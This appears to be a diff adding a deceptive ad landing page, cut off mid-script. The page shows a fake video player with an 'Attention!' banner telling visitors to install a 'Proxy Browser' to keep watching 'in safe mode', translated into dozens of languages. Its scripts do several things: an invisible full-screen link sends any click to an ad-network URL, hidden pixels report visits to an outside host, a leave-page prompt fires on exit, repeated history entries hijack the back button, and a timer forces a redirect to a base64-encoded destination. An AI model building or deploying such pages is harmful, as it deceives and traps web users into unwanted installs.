@@ -1,0 +1,1019 @@
+<!DOCTYPE html><html><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title id="a1">Attention!</title>
+  <link rel="icon" href="fav.webp">
+  <link href="staff/618122e7088e8.css" rel="stylesheet">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&amp;display=swap" rel="stylesheet">
+  <script>
+    function getURLParameter(name) {
+      return decodeURIComponent(
+        (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+      );
+    }
+  </script>
+
+</head>
+
+<body onload="translate();realImpression();">
+
+  <div class="wrapper">
+    <div class="top_wrapper">
+      <h1 id="a2">Attention!</h1>
+      <p id="a3">Please install the <b>Proxy Browser</b> to continue watching in safe mode.</p>
+      <p></p>
+    </div>
+
+    <p class="button" id="a4">Install</p>
+
+  </div>
+  <section class="player">
+    <div class="player_content">
+      <img class="loading" src="staff/618122e708794.webp" alt="">
+      <img class="play" src="staff/618122e7087e9.webp" alt="">
+    </div>
+    <div class="top_icons">
+      <img src="staff/close.webp"> <img src="staff/thumb.webp">
+
+    </div>
+    <div class="player_navigation">
+      <div class="player_navigation_item">
+        <div class="pause_play">
+          <img src="staff/618122e708859.webp" alt="">
+          <img src="staff/618122e708870.webp" alt="">
+        </div>
+        <p>00:0<span id="counter_wrapper">2</span>/1:52:46</p>
+      </div>
+      <div class="progress">
+        <div class="progress_load">
+          <div class="progress_line"></div>
+        </div>
+      </div>
+      <div class="player_navigation_item">
+        <img src="staff/618122e708887.webp" alt="">
+        <!-- <img class="img_padding" src="staff/618122e7088ca.webp" alt=""> -->
+        <img src="staff/618122e70889d.webp" alt="">
+        <img src="staff/618122e7088b2.webp" alt="">
+        <img src="staff/618122e7088ca.webp" alt="">
+      </div>
+    </div>
+  </section>
+
+  <a href="https://sctclick2.com/click?key=1c32c366f1ff4db1a3c06fe61260e742&amp;SUB_ID_SHORT=68607b67e9c38e3fa89c9e2442521f39&amp;PLACEMENT_ID=24684767&amp;COUNTRY=AT&amp;LAND_ID=11840&amp;CAMPAIGN_ID=1393091&amp;PUBLISHER_ID=211334&amp;ZONE_ID=1344694&amp;USER_OS_VER=11.0&amp;BROWSER_NAME=Chrome+Mobile&amp;REMOTE_LANGUAGE_CODE=en&amp;BANNER_ID=3698970&amp;PLACEMENT_CATEGORY_ID=3" class="finlink" style="
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  z-index: 99999;
+  "></a>
+
+  <script type="text/javascript">
+    var prelandId = getURLParameter('c');
+    var adUnitId = getURLParameter('u');
+
+    function getURLParameter(name) {
+      return decodeURIComponent(
+        (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+      );
+    }
+
+    function checkReferer() {
+      const referrer = document.referrer;
+      const currentUrl = location.href;
+      return referrer && currentUrl !== referrer;
+    }
+
+    function realImpression() {
+
+      const isActionTriggered = sessionStorage.getItem('realImpression')
+      const isReferrer = checkReferer();
+
+      if (!isActionTriggered && isReferrer) {
+        let pixelImg_1 = document.createElement('img');
+        pixelImg_1.src = 'https://locusflourishgarlic.com/pixel/preland?c=' + prelandId + '&e=1&u=' + adUnitId;
+        console.log(pixelImg_1.src);
+        pixelImg_1.style.display = 'none';
+        document.body.appendChild(pixelImg_1);
+
+        sessionStorage.setItem('realImpression', true)
+        console.log('realImpression');
+      }
+    }
+
+    function prelandAction(evt) {
+
+      evt.preventDefault();
+
+      const isActionTriggered = sessionStorage.getItem('prelandAction')
+      const isReferrer = checkReferer();
+
+      if (!isActionTriggered && isReferrer) {
+        let pixelImg_2 = document.createElement('img');
+        pixelImg_2.src = 'https://locusflourishgarlic.com/pixel/preland?c=' + prelandId + '&e=2&u=' + adUnitId;
+        console.log(pixelImg_2.src);
+        pixelImg_2.style.display = 'none';
+        document.body.appendChild(pixelImg_2);
+        brAction = null;
+        brAction = function () {}
+        sessionStorage.setItem('prelandAction', true)
+        console.log('prelandAction');
+      }
+
+      setTimeout(() => {
+        var thisLink = evt.target.closest('.finlink').href;
+        window.location.href = thisLink;
+      }, 500);
+
+    }
+
+    setTimeout(() => {
+      brAction = null;
+      brAction = function () {}
+    }, 4000);
+
+    function brAction() {
+      const isActionTriggered = sessionStorage.getItem('brAction')
+      const isReferrer = checkReferer();
+
+      if (!isActionTriggered && isReferrer) {
+        let pixelImg_3 = document.createElement('img');
+        pixelImg_3.src = 'https://locusflourishgarlic.com/pixel/preland?c=' + prelandId + '&e=3&u=' + adUnitId;
+        console.log(pixelImg_3.src);
+        pixelImg_3.style.display = 'none';
+        document.body.appendChild(pixelImg_3);
+        console.log('brAction');
+        sessionStorage.setItem('brAction', true)
+      }
+    }
+
+    // window.onload = function () {
+
+    //     realImpression();
+    // };
+
+    function befUnlFunc(e) {
+      e.preventDefault();
+      brAction();
+      console.log('page closed');
+      const confirmationMessage = 'Are you sure you want to leave the page?';
+      e.returnValue = confirmationMessage;
+      return confirmationMessage;
+    }
+    window.addEventListener('beforeunload', befUnlFunc);
+  </script>
+
+  <script type="text/javascript">
+    var fin_link = encodeUrlOnlyParamsV2(decodeURIComponent(getBase64URLParameter('p1')));
+    console.dir(fin_link);
+
+
+    function getURLParameter(name) {
+      return (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || '';
+    }
+
+    function getBase64URLParameter(name) {
+      var value = getURLParameter(name);
+
+      try {
+        return window.atob(value.replace(/-/g, '+').replace(/_/g, '/'));
+      } catch {
+        return value;
+      }
+    }
+
+
+    function encodeUrlOnlyParamsV2(url) {
+      let questionMarkIndex = url.indexOf("?");
+      if (questionMarkIndex === -1) return url;
+
+      let baseUrl = url.slice(0, questionMarkIndex);
+      let queryString = url.slice(questionMarkIndex + 1);
+
+      let params = new URLSearchParams(queryString);
+      let encodedParams = new URLSearchParams();
+
+      params.forEach((value, key) => {
+        encodedParams.append(key, value);
+      });
+
+      return `${baseUrl}?${encodedParams.toString()}`;
+    }
+
+    var links = document.getElementsByClassName('finlink');
+    for (var i = 0; i < links.length; i++) links[i].setAttribute("href", fin_link);
+
+    for (var j = 0; j < links.length; j++) {
+      links[j].addEventListener('click', function (evt) {
+
+        prelandAction(evt);
+        window.removeEventListener('beforeunload', befUnlFunc);
+
+        window.onbeforeunload = null;
+      });
+    }
+
+
+
+    //Autoredirect
+    setTimeout(function () {
+      window.onbeforeunload = null;
+      window.location.href = fin_link;
+    }, 60000 * 2);
+
+    //Historyback
+    ! function () {
+      var t;
+      try {
+        for (t = 0; 10 > t; ++t) history.pushState({}, "", "");
+        onpopstate = function (t) {
+          window.onbeforeunload = null;
+          t.state && location.replace(fin_link);
+        };
+      } catch (o) {}
+    }();
+  </script>
+
+  <script>
+    function getURLParameter(name) {
+      return decodeURIComponent(
+        (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+      );
+    }
+    strAlert = "";
+
+    var translation = {
+      source: {
+        a1: "Attention!",
+        a2: "Attention!",
+        a3: "Please install the <b>Proxy Browser</b> to continue watching in safe mode.",
+        a4: "Install",
+      },
+
+      en: {
+        a1: "Attention!",
+        a2: "Attention!",
+        a3: "Please install the <b>Proxy Browser</b> to continue watching in safe mode.",
+        a4: "Install"
+      },
+
+      es: {
+        a1: "¡Atención!",
+        a2: "¡Atención!",
+        a3: "Por favor, instale el <b>Proxy Browser</b> para continuar viendo en modo seguro.",
+        a4: "Instalar"
+      },
+
+      fr: {
+        a1: "Attention !",
+        a2: "Attention !",
+        a3: "Veuillez installer le <b>Proxy Browser</b> pour continuer à regarder en mode sécurisé.",
+        a4: "Installer"
+      },
+
+      de: {
+        a1: "Achtung!",
+        a2: "Achtung!",
+        a3: "Bitte installieren Sie den <b>Proxy Browser</b>, um im sicheren Modus weiterzuschauen.",
+        a4: "Installieren"
+      },
+
+      it: {
+        a1: "Attenzione!",
+        a2: "Attenzione!",
+        a3: "Si prega di installare il <b>Proxy Browser</b> per continuare a guardare in modalità sicura.",
+        a4: "Installa"
+      },
+
+      pt: {
+        a1: "Atenção!",
+        a2: "Atenção!",
+        a3: "Por favor, instale o <b>Proxy Browser</b> para continuar assistindo em modo seguro.",
+        a4: "Instalar"
+      },
+
+      ru: {
+        a1: "Внимание!",
+        a2: "Внимание!",
+        a3: "Пожалуйста, установите <b>Proxy Browser</b>, чтобы продолжить просмотр в безопасном режиме.",
+        a4: "Установить"
+      },
+
+      pl: {
+        a1: "Uwaga!",
+        a2: "Uwaga!",
+        a3: "Proszę zainstalować <b>Proxy Browser</b>, aby kontynuować oglądanie w trybie bezpiecznym.",
+        a4: "Zainstaluj"
+      },
+
+      nl: {
+        a1: "Aandacht!",
+        a2: "Aandacht!",
+        a3: "Installeer alstublieft de <b>Proxy Browser</b> om verder te kijken in veilige modus.",
+        a4: "Installeren"
+      },
+
+      uk: {
+        a1: "Увага!",
+        a2: "Увага!",
+        a3: "Будь ласка, встановіть <b>Proxy Browser</b>, щоб продовжити перегляд у безпечному режимі.",
+        a4: "Встановити"
+      },
+
+      cs: {
+        a1: "Pozor!",
+        a2: "Pozor!",
+        a3: "Prosím, nainstalujte <b>Proxy Browser</b> pro pokračování v bezpečném režimu.",
+        a4: "Instalovat"
+      },
+
+      sv: {
+        a1: "Uppmärksamhet!",
+        a2: "Uppmärksamhet!",
+        a3: "Vänligen installera <b>Proxy Browser</b> för att fortsätta titta i säkert läge.",
+        a4: "Installera"
+      },
+
+      da: {
+        a1: "Opmærksomhed!",
+        a2: "Opmærksomhed!",
+        a3: "Installer venligst <b>Proxy Browser</b> for at fortsætte med at se i sikker tilstand.",
+        a4: "Installer"
+      },
+
+      no: {
+        a1: "Oppmerksomhet!",
+        a2: "Oppmerksomhet!",
+        a3: "Vennligst installer <b>Proxy Browser</b> for å fortsette å se i sikker modus.",
+        a4: "Installer"
+      },
+
+      fi: {
+        a1: "Huomio!",
+        a2: "Huomio!",
+        a3: "Asenna <b>Proxy Browser</b> jatkaaksesi katsomista turvatilassa.",
+        a4: "Asenna"
+      },
+
+      el: {
+        a1: "Προσοχή!",
+        a2: "Προσοχή!",
+        a3: "Παρακαλώ εγκαταστήστε το <b>Proxy Browser</b> για να συνεχίσετε την παρακολούθηση σε ασφαλή λειτουργία.",
+        a4: "Εγκατάσταση"
+      },
+
+      tr: {
+        a1: "Dikkat!",
+        a2: "Dikkat!",
+        a3: "Güvenli modda izlemeye devam etmek için lütfen <b>Proxy Browser</b> yükleyin.",
+        a4: "Yükle"
+      },
+
+      hu: {
+        a1: "Figyelem!",
+        a2: "Figyelem!",
+        a3: "Kérjük telepítse a <b>Proxy Browser</b>-t a biztonságos módban való folytatáshoz.",
+        a4: "Telepítés"
+      },
+
+      ro: {
+        a1: "Atenție!",
+        a2: "Atenție!",
+        a3: "Vă rugăm să instalați <b>Proxy Browser</b> pentru a continua vizionarea în modul sigur.",
+        a4: "Instalați"
+      },
+
+      bg: {
+        a1: "Внимание!",
+        a2: "Внимание!",
+        a3: "Моля, инсталирайте <b>Proxy Browser</b>, за да продължите да гледате в безопасен режим.",
+        a4: "Инсталирайте"
+      },
+
+      hr: {
+        a1: "Pozornost!",
+        a2: "Pozornost!",
+        a3: "Molimo instalirajte <b>Proxy Browser</b> kako biste nastavili gledati u sigurnom načinu.",
+        a4: "Instalirajте"
+      },
+
+      sk: {
+        a1: "Pozor!",
+        a2: "Pozor!",
+        a3: "Prosím, nainštalujte <b>Proxy Browser</b> pre pokračovanie v bezpečnom režime.",
+        a4: "Nainštalovať"
+      },
+
+      sl: {
+        a1: "Pozor!",
+        a2: "Pozor!",
+        a3: "Prosimo, namestite <b>Proxy Browser</b>, da nadaljujete z ogledom v varnem načinu.",
+        a4: "Namesti"
+      },
+
+      et: {
+        a1: "Tähelepanu!",
+        a2: "Tähelepanu!",
+        a3: "Palun installeeri <b>Proxy Browser</b>, et jätkata turvarežiimis vaatamist.",
+        a4: "Installi"
+      },
+
+      lv: {
+        a1: "Uzmanību!",
+        a2: "Uzmanību!",
+        a3: "Lūdzu, instalējiet <b>Proxy Browser</b>, lai turpinātu skatīties drošajā režīmā.",
+        a4: "Instalēt"
+      },
+
+      lt: {
+        a1: "Dėmesio!",
+        a2: "Dėmesio!",
+        a3: "Prašome įdiegti <b>Proxy Browser</b>, kad galėtumėte saugiai tęsti žiūrėjimą.",
+        a4: "Įdiegti"
+      },
+
+      be: {
+        a1: "Увага!",
+        a2: "Увага!",
+        a3: "Калі ласка, усталюйце <b>Proxy Browser</b> для працягу глядзення ў бяспечным рэжыме.",
+        a4: "Усталяваць"
+      },
+
+      mk: {
+        a1: "Внимание!",
+        a2: "Внимание!",
+        a3: "Ве молиме инсталирајте го <b>Proxy Browser</b> за да продолжите со гледање во безбеден режим.",
+        a4: "Инсталирајте"
+      },
+
+      sq: {
+        a1: "Vëmendje!",
+        a2: "Vëmendje!",
+        a3: "Ju lutem instaloni <b>Proxy Browser</b> për të vazhduar të shikoni në modalitetin e sigurt.",
+        a4: "Instalo"
+      },
+
+      sr: {
+        a1: "Пажња!",
+        a2: "Пажња!",
+        a3: "Молимо инсталирајте <b>Proxy Browser</b> да бисте наставили гледање у безбедном моду.",
+        a4: "Инсталирајте"
+      },
+
+      bs: {
+        a1: "Pažnja!",
+        a2: "Pažnja!",
+        a3: "Molimo instalirajte <b>Proxy Browser</b> da nastavite gledanje u sigurnom modu.",
+        a4: "Instalirajте"
+      },
+
+      mt: {
+        a1: "Attenzjoni!",
+        a2: "Attenzjoni!",
+        a3: "Jekk jogħġbok installa l-<b>Proxy Browser</b> biex tkompli tara f'modalità sigura.",
+        a4: "Installa"
+      },
+
+      is: {
+        a1: "Athygli!",
+        a2: "Athygli!",
+        a3: "Vinsamlegast settu upp <b>Proxy Browser</b> til að halda áfram að horfa í öruggum ham.",
+        a4: "Setja upp"
+      },
+
+      ga: {
+        a1: "Aird!",
+        a2: "Aird!",
+        a3: "Cuir an <b>Proxy Browser</b> isteach le leanúint ar aghaidh ag faire i mód sábháilte",
+        a4: "Cuir isteach"
+      },
+
+      cy: {
+        a1: "Sylw!",
+        a2: "Sylw!",
+        a3: "Os gwelwch yn dda gosodwch y <b>Proxy Browser</b> i barhau i wylio yn y modd diogel.",
+        a4: "Gosodwch"
+      },
+
+      eu: {
+        a1: "Arreta!",
+        a2: "Arreta!",
+        a3: "Mesedez instalatu <b>Proxy Browser</b> segurtasun moduan jarraitzeko",
+        a4: "Instalatu"
+      },
+
+      ca: {
+        a1: "Atenció!",
+        a2: "Atenció!",
+        a3: "Si us plau, instal·leu el <b>Proxy Browser</b> per continuar veient en mode segur.",
+        a4: "Instal·la"
+      },
+
+      gl: {
+        a1: "Atención!",
+        a2: "Atención!",
+        a3: "Por favor, instala o <b>Proxy Browser</b> para continuar vendo en modo seguro.",
+        a4: "Instalar"
+      },
+
+      lb: {
+        a1: "Opmierksamkeet!",
+        a2: "Opmierksamkeet!",
+        a3: "W.e.g. installéiert de <b>Proxy Browser</b> fir weiderzekucken am séchere Modus.",
+        a4: "Installéieren"
+      },
+
+      zh: {
+        a1: "注意！",
+        a2: "注意！",
+        a3: "请安装<b>Proxy Browser</b>以安全模式继续观看。",
+        a4: "安装"
+      },
+
+
+      hi: {
+        a1: "ध्यान दें!",
+        a2: "ध्यान दें!",
+        a3: "सुरक्षित मोड में देखना जारी रखने के लिए कृपया <b>Proxy Browser</b> स्थापित करें।",
+        a4: "स्थापित करें"
+      },
+
+      ja: {
+        a1: "注意！",
+        a2: "注意！",
+        a3: "安全モードで視聴を続けるには、<b>Proxy Browser</b>をインストールしてください。",
+        a4: "インストール"
+      },
+
+      ko: {
+        a1: "주목하세요!",
+        a2: "주목하세요!",
+        a3: "안전 모드에서 계속 시청하려면 <b>Proxy Browser</b>를 설치하세요.",
+        a4: "설치하세요"
+      },
+
+      ar: {
+        a1: "انتباه!",
+        a2: "انتباه!",
+        a3: "يرجى تثبيت <b>Proxy Browser</b> للاستمرار بالمشاهدة في الوضع الآمن.",
+        a4: "تثبيت"
+      },
+
+      bn: {
+        a1: "মনোযোগ!",
+        a2: "মনোযোগ!",
+        a3: "নিরাপদ মোডে দেখতে চালিয়ে যেতে <b>Proxy Browser</b> ইনস্টল করুন।",
+        a4: "ইনস্টল করুন"
+      },
+
+      ur: {
+        a1: "توجہ!",
+        a2: "توجہ!",
+        a3: "محفوظ موڈ میں دیکھتے رہنے کے لئے براہ کرم <b>Proxy Browser</b> انسٹال کریں۔",
+        a4: "انسٹال کریں"
+      },
+
+      fa: {
+        a1: "توجه!",
+        a2: "توجه!",
+        a3: "لطفاً <b>Proxy Browser</b> را نصب کنید تا در حالت امن ادامه دهید.",
+        a4: "نصب کنید"
+      },
+
+      vi: {
+        a1: "Chú ý!",
+        a2: "Chú ý!",
+        a3: "Vui lòng cài đặt <b>Proxy Browser</b> để tiếp tục xem trong chế độ an toàn.",
+        a4: "Cài đặt"
+      },
+
+      th: {
+        a1: "โปรดทราบ!",
+        a2: "โปรดทราบ!",
+        a3: "โปรดติดตั้ง <b>Proxy Browser</b> เพื่อดำเนินการต่อในโหมดปลอดภัย",
+        a4: "ติดตั้ง"
+      },
+
+      id: {
+        a1: "Perhatian!",
+        a2: "Perhatian!",
+        a3: "Silakan pasang <b>Proxy Browser</b> untuk melanjutkan menonton dalam mode aman.",
+        a4: "Pasang"
+      },
+
+      ms: {
+        a1: "Perhatian!",
+        a2: "Perhatian!",
+        a3: "Sila pasang <b>Proxy Browser</b> untuk terus menonton dalam mod selamat.",
+        a4: "Pasang"
+      },
+
+      fil: {
+        a1: "Pansin!",
+        a2: "Pansin!",
+        a3: "Mangyaring i-install ang <b>Proxy Browser</b> upang magpatuloy sa panonood sa ligtas na mode.",
+        a4: "I-install"
+      },
+
+      my: {
+        a1: "သတိပေးချက်။",
+        a2: "သတိပေးချက်။",
+        a3: "ဆက်လက်ကြည့်ရှုရန် <b>Proxy Browser</b> ကို တပ်ဆင်ပါ။",
+        a4: "တပ်ဆင်ပါ"
+      },
+
+      ka: {
+        a1: "ყურადღება!",
+        a2: "ყურადღება!",
+        a3: "გთხოვთ, დააყენეთ <b>Proxy Browser</b> რომ გაგრძელოთ ყურება უსაფრთხო რეჟიმში.",
+        a4: "დააყენეთ"
+      },
+
+      hy: {
+        a1: "Ուշադիր։",
+        a2: "Ուշադիր։",
+        a3: "Խնդրում ենք տեղադրել <b>Proxy Browser</b>ը՝ շարունակելու անվտանգ ռեժիմում։",
+        a4: "Տեղադրել"
+      },
+
+      az: {
+        a1: "Diqqət!",
+        a2: "Diqqət!",
+        a3: "Davam etmək üçün <b>Proxy Browser</b> quraşdırın.",
+        a4: "Quraşdırın"
+      },
+
+      kk: {
+        a1: "Назар аударыңыз!",
+        a2: "Назар аударыңыз!",
+        a3: "Жалғастыру үшін <b>Proxy Browser</b> орнатыңыз.",
+        a4: "Орнату"
+      },
+
+      ky: {
+        a1: "Көңүл буруңуз!",
+        a2: "Көңүл буруңуз!",
+        a3: "Коопсуз режимде көрүүнү улантуу үчүн <b>Proxy Browser</b> орнотуңуз.",
+        a4: "Орнотуу"
+      },
+
+      uz: {
+        a1: "E'tibor bering!",
+        a2: "E'tibor bering!",
+        a3: "Xavfsiz rejimda ko'rishni davom ettirish uchun iltimos, <b>Proxy Browser</b>ni o'rnating.",
+        a4: "O'rnatish"
+      },
+
+      tg: {
+        a1: "Эътибор!",
+        a2: "Эътибор!",
+        a3: "Лутфан, барои идома додани тамошо дар режими бехатар <b>Proxy Browser</b>-ро насб кунед.",
+        a4: "Насб кунед"
+      },
+
+      tk: {
+        a1: "Üns beriň!",
+        a2: "Üns beriň!",
+        a3: "Dowam etmek üçin <b>Proxy Browser</b> gurnaň.",
+        a4: "Gurnaň"
+      },
+
+      mn: {
+        a1: "Анхаар!",
+        a2: "Анхаар!",
+        a3: "Үргэлжлүүлэн үзэхийн тулд <b>Proxy Browser</b>-г суулгана уу.",
+        a4: "Суулгах"
+      },
+
+      ne: {
+        a1: "ध्यान दिनुहोस्!",
+        a2: "ध्यान दिनुहोस्!",
+        a3: "सुरक्षित मोडमा हेर्न जारी राख्नको लागि कृपया <b>Proxy Browser</b> स्थापना गर्नुहोस्।",
+        a4: "स्थापना गर्नुहोस्"
+      },
+
+      si: {
+        a1: "අවධානයයි!",
+        a2: "අවධානයයි!",
+        a3: "ආරක්ෂිත ප්‍රකාරයට නරඹන්නට ඉදිරියට යාමට <b>Proxy Browser</b> ස්ථාපනය කරන්න.",
+        a4: "ස්ථාපනය කරන්න"
+      },
+
+      ta: {
+        a1: "கவனம்!",
+        a2: "கவனம்!",
+        a3: "பாதுகாப்பான முறையில் தொடர்ந்து பார்க்க <b>Proxy Browser</b> நிறுவவும்.",
+        a4: "நிறுவுக"
+      },
+
+      te: {
+        a1: "శ్రద్ధించండి!",
+        a2: "శ్రద్ధించండి!",
+        a3: "సురక్షిత మోడ్‌లో చూడడాన్ని కొనసాగించడానికి <b>Proxy Browser</b> ను ఇన్‌స్టాల్ చేయండి.",
+        a4: "ఇన్‌స్టాల్ చేయండి"
+      },
+
+      kn: {
+        a1: "ಗಮನಿಸಿ!",
+        a2: "ಗಮನಿಸಿ!",
+        a3: "ಸುರಕ್ಷಿತ ಮೋಡ್‌ನಲ್ಲಿ ಮುಂದುವರಿಯಲು <b>Proxy Browser</b> ಅನ್ನು ಸ್ಥಾಪಿಸಿ.",
+        a4: "ಸ್ಥಾಪಿಸಿ"
+      },
+
+      ml: {
+        a1: "ശ്രദ്ധിക്കുക!",
+        a2: "ശ്രദ്ധിക്കുക!",
+        a3: "തുടരാൻ സുരക്ഷിത മോഡിൽ കാണുന്നതിന് <b>Proxy Browser</b> ഇൻസ്റ്റാൾ ചെയ്യുക",
+        a4: "ഇൻസ്റ്റാൾ ചെയ്യുക"
+      },
+
+      mr: {
+        a1: "लक्ष द्या!",
+        a2: "लक्ष द्या!",
+        a3: "सुरक्षित मोडमध्ये पाहणे सुरू ठेवण्यासाठी कृपया <b>Proxy Browser</b> इंस्टॉल करा.",
+        a4: "इंस्टॉल करा"
+      },
+
+      gu: {
+        a1: "ધ્યાન આપો!",
+        a2: "ધ્યાન આપો!",
+        a3: "સુરક્ષિત મોડમાં ચાલુ રાખવા માટે <b>Proxy Browser</b> ઇન્સ્ટોલ કરો.",
+        a4: "ઇન્સ્ટોલ કરો"
+      },
+
+      pa: {
+        a1: "ਧਿਆਨ ਦਿਓ!",
+        a2: "ਧਿਆਨ ਦਿਓ!",
+        a3: "ਜਾਰੀ ਰੱਖਣ ਲਈ ਕ੍ਰਿਪਾ ਕਰਕੇ <b>Proxy Browser</b> ਇੰਸਟਾਲ ਕਰੋ।",
+        a4: "ਇੰਸਟਾਲ ਕਰੋ"
+      },
+
+      or: {
+        a1: "ସତର୍କତା!",
+        a2: "ସତର୍କତା!",
+        a3: "ସୁରକ୍ଷିତ ମୋଡରେ ଦେଖା ଚାଲିତି ରଖିବାକୁ <b>Proxy Browser</b> ଇନସ୍ଟଲ କରନ୍ତୁ।",
+        a4: "ଇନସ୍ଟଲ କରନ୍ତୁ"
+      },
+
+      as: {
+        a1: "মনোযোগ!",
+        a2: "মনোযোগ!",
+        a3: "নিরাপদ মোডত চালিয়ে যাবলৈ <b>Proxy Browser</b> ইনস্টল কৰক",
+        a4: "ইনস্টল"
+      },
+
+      ks: {
+        a1: "توجہ!",
+        a2: "توجہ!",
+        a3: "مہربانی کرکے <b>Proxy Browser</b> انسٹال کرن واریاو تاکہ محفوظ موڈس منز دیکھن جاری رکھنۍ",
+        a4: "انسٹال کرن"
+      },
+
+      sd: {
+        a1: "توجه!",
+        a2: "توجه!",
+        a3: "مهرباني ڪري <b>Proxy Browser</b> انسٽال ڪريو تاڻ ته توهان محفوظ طريقي سان واچنگ جاري رکندي.",
+        a4: "انسٽال ڪريو"
+      },
+
+      jw: {
+        a1: "Awas!",
+        a2: "Awas!",
+        a3: "Mangga pasang <b>Proxy Browser</b> kanggo terus mirsani kanthi mode aman",
+        a4: "Pasang"
+      },
+
+      su: {
+        a1: "Perhatosan!",
+        a2: "Perhatosan!",
+        a3: "Mangga pasang <b>Proxy Browser</b> pikeun neraskeun nongton dina mode aman",
+        a4: "Pasang"
+      },
+
+      lo: {
+        a1: "ປະກັນສະພາບ!",
+        a2: "ປະກັນສະພາບ!",
+        a3: "ກະລຸນາຕິດຕັ້ງ <b>Proxy Browser</b> ເພື່ອສືບຕໍ່ການເບິ່ງໃນໂໝດປອດໄພ",
+        a4: "ຕິດຕັ້ງ"
+      },
+
+      km: {
+        a1: "ចាប់អារម្មណ៍!",
+        a2: "ចាប់អារម្មណ៍!",
+        a3: "សូមដំឡើង <b>Proxy Browser</b> ដើម្បីបន្តទស្សនា​ក្នុង​របៀប​សុវត្ថិភាព។",
+        a4: "ដំឡើង"
+      },
+
+      ku: {
+        a1: "تەماشا!",
+        a2: "تەماشا!",
+        a3: "تکایە <b>Proxy Browser</b> دابمەزرێنە بۆ بەردەوامبوون لە دیتن بە شێوەیەکی ئاسوودە.",
+        a4: "دامەزراندن"
+      },
+
+      he: {
+        a1: "תשומת לב!",
+        a2: "תשומת לב!",
+        a3: "אנא התקן את <b>Proxy Browser</b> כדי להמשיך לצפות במצב בטוח.",
+        a4: "התקן"
+      },
+
+      sa: {
+        a1: "ध्यान दें!",
+        a2: "ध्यान दें!",
+        a3: "कृपया सुरक्षित मोड में देखना जारी रखने के लिए <b>Proxy Browser</b> स्थापित करें",
+        a4: "स्थापित करें"
+      },
+
+      kok: {
+        a1: "Laksha!",
+        a2: "Laksha!",
+        a3: "Krupaya <b>Proxy Browser</b> instal korun surakshit modant pude pahat rahat.",
+        a4: "Instal karin"
+      },
+
+      mai: {
+        a1: "सावधान!",
+        a2: "सावधान!",
+        a3: "कृपया जारी रखबाक लेल सुरक्षित मोड में देखय खातिर <b>Proxy Browser</b> इन्स्टॉल करू",
+        a4: "इन्स्टॉल करू"
+      },
+
+      sat: {
+        a1: "ᱥᱟᱹᱜᱟᱣᱟᱹ!",
+        a2: "ᱥᱟᱹᱜᱟᱣᱟᱹ!",
+        a3: "ᱯᱷᱚᱸ ᱦᱟᱹᱨᱥᱤ ᱠᱚᱨᱮᱸ <b>Proxy Browser</b> ᱨᱮ ᱥᱮᱱᱟᱜ ᱢᱚᱫ ᱥᱟᱹᱜᱟᱹᱨ ᱠᱟᱹᱜᱚᱸ",
+        a4: "ᱦᱟᱹᱨᱥᱤ ᱠᱚᱨᱮᱸ"
+      },
+
+      brx: {
+        a1: "खबरदार!",
+        a2: "खबरदार!",
+        a3: "निरापद मोडथि जारी थानि खातिर <b>Proxy Browser</b> इन्स्टॉल कराओ",
+        a4: "इन्स्टॉल"
+      },
+
+      doi: {
+        a1: "ध्यान द्यो!",
+        a2: "ध्यान द्यो!",
+        a3: "कृपया जारी रखण लई सुरक्षित मोड विच <b>Proxy Browser</b> इंस्टाल करो।",
+        a4: "इंस्टाल करो"
+      },
+
+      mni: {
+        a1: "শয়ন!",
+        a2: "শয়ন!",
+        a3: "অনুগ্রহ করি <b>Proxy Browser</b> স্থাপন করক নিরাপদ মোডত চালু থাকিবাক তৌবদা",
+        a4: "স্থাপন"
+      },
+
+      af: {
+        a1: "Aandag!",
+        a2: "Aandag!",
+        a3: "Installeer asseblief die <b>Proxy Browser</b> om voort te gaan om in veilige modus te kyk.",
+        a4: "Installeer"
+      },
+
+      sw: {
+        a1: "Tahadhari!",
+        a2: "Tahadhari!",
+        a3: "Tafadhali sakinisha <b>Proxy Browser</b> ili uendelee kutazama kwa njia salama",
+        a4: "Sakinisha"
+      },
+
+      zu: {
+        a1: "Naka!",
+        a2: "Naka!",
+        a3: "Sicela ufake i-<b>Proxy Browser</b> ukuze uqhubeke nokubuka kumodi ephephile",
+        a4: "Faka"
+      },
+
+      xh: {
+        a1: "Ingqalelo!",
+        a2: "Ingqalelo!",
+        a3: "Nceda ufake i <b>Proxy Browser</b> ukuze uqhubeke nokubukela kwi-safe mode",
+        a4: "Faka"
+      },
+
+      yo: {
+        a1: "Akiyesi!",
+        a2: "Akiyesi!",
+        a3: "Jọwọ fi sori ẹrọ <b>Proxy Browser</b> lati tẹsiwaju wiwo ni ipo ailewu",
+        a4: "Fi sori ẹrọ"
+      },
+
+      ig: {
+        a1: "Nleba anya!",
+        a2: "Nleba anya!",
+        a3: "Biko wụnye <b>Proxy Browser</b> iji nọgide na-ekiri n'ụzọ dị mma",
+        a4: "Wụnye"
+      },
+
+      ha: {
+        a1: "Hankali!",
+        a2: "Hankali!",
+        a3: "Da fatan a shigar da <b>Proxy Browser</b> don ci gaba da kallon cikin yanayi mai aminci.",
+        a4: "Shigar"
+      },
+
+      am: {
+        a1: "ትእዛዝ!",
+        a2: "ትእዛዝ!",
+        a3: "በደህንነት ሞዴ ለመቀጠል እባኮ <b>Proxy Browser</b> ይጫኑ",
+        a4: "ጫን"
+      },
+
+      so: {
+        a1: "Fiiro gaar ah!",
+        a2: "Fiiro gaar ah!",
+        a3: "Fadlan ku rakib <b>Proxy Browser</b> si aad u sii wadato daawashada qaab ammaan ah",
+        a4: "Ku rakib"
+      },
+
+      mg: {
+        a1: "Mitandrema!",
+        a2: "Mitandrema!",
+        a3: "Mba mametraka ny <b>Proxy Browser</b> mba hahafahanao mijery ao anatin'ny fomba azo antoka.",
+        a4: "Mametraka"
+      },
+
+
+
+
+
+    };
+
+    function replace_text(lang, text) {
+  var x = document.getElementById(text);
+  if (x) {
+    x.innerHTML = translation[lang][text];
